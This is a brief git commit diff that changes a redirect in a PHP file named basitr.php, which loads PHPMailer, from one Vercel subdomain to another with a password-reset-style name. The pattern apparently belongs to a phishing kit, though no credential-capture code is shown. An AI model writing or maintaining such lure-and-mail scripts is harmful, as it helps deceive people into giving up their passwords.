01cc4c738e1f1d587152a99d4db3adca4f9d1002
contentemmaronnie <content.emmaronnie.ads@gmail.com>
2025-07-10 14:30:47 +0500

    Update basitr.php

--- basitr.php
+++ basitr.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-pass-eight.vercel.app/");
+header("Location: https://repass-aprove.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
